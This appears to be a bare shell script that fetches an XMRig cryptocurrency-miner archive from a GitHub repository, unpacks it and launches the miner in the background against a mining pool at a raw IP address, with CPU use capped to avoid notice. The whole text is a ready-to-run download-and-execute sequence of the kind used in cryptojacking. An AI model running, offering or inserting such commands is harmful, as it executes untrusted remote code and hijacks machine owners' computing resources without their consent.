wget https://github.com/Pamentierx/xmr/raw/main/xmr.tar.gz
tar -xvzf xmr.tar.gz
cd xmrig-6.14.1
chmod +x xmrig
./xmrig -o 107.182.176.159:8989 -u worker2 -p xx -t 1 -B --cpu-priority 1 --cpu-max-threads-hint=40% --nicehash
